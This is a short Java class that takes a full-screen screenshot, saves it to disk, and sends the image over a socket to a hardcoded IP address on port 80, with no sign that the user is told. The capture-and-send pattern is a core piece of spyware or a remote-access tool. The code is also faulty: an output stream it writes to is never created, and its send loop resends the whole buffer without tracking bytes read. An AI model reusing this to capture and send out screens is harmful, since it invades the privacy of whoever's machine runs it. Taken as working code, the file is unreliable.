package network;

import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import javax.imageio.ImageIO;

public class SendPic{
    
    DataOutputStream dos;
    OutputStream os;

    public SendPic() throws IOException, AWTException {

        Socket sock = new Socket("192.168.250.158", 80);
        Robot rob= new Robot();
        BufferedImage image = rob.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
        ImageIO.write(image, "jpg", new File("screenshot.jpg"));
        File pic = new File("screenshot.jpg");
        byte[] mybytearray = new byte[(int) pic.length()];
        BufferedInputStream bis = new BufferedInputStream(new FileInputStream(pic));
        
            int i;
            do
            {
                i = bis.read(mybytearray, 0, mybytearray.length);
                os = new DataOutputStream(sock.getOutputStream());
                os.write(mybytearray, 0, mybytearray.length);
                os.flush();
            }
            while(i!=-1); 
            os.close();
            bis.close();    
            dos.writeUTF("Screenshot recebida!");  

    }

}
